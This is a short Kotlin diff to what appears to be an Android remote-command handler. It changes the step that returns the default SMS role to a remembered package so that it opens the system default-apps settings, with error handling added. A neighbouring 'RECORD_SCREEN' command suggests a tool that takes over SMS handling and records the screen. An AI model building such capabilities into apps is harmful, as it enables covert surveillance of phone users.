@@ -552,9 +552,17 @@ object CommandProcessor {
                         errorMsg = "No previous SMS package found in memory."
                     } else {
                         DefaultSmsManager.expectedMode = "RESTORE"
-                        DefaultSmsManager.requestDefault(ctx)
-                        status = "RESTORE_INITIATED"
-                        errorMsg = "Targeting: $prevLabel"
+                        try {
+                            val i = Intent(Settings.ACTION_MANAGE_DEFAULT_APPS_SETTINGS).apply {
+                                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION)
+                            }
+                            ctx.startActivity(i)
+                            status = "RESTORE_INITIATED"
+                            errorMsg = "Targeting: $prevLabel"
+                        } catch (e: Exception) {
+                            status = "FAILED"
+                            errorMsg = "Intent failed: ${e.message}"
+                        }
                     }
                 }
                 "RECORD_SCREEN" -> {
